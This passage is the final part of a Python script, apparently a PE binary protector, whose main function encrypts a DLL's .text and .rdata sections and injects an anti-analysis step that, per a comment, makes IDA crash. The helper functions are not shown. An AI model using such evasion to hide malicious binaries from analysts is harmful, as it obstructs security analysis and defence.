    filepath = sys.argv[1]

    # Encrypt .text first, then .rdata.
    # Order matters: both must succeed for a valid protected binary.
    if not encrypt_text_section(filepath):
        sys.exit(1)

    if not encrypt_rdata_section(filepath):
        sys.exit(1)

    # Anti-static-analysis: make IDA crash when analysing this DLL.
    if not inject_anti_analysis(filepath):
        print("[pe_protect] WARNING: Anti-analysis injection failed — "
              "continuing without it.", file=sys.stderr)

    print(f"[pe_protect] All protection steps completed successfully.")


if __name__ == '__main__':
    main()
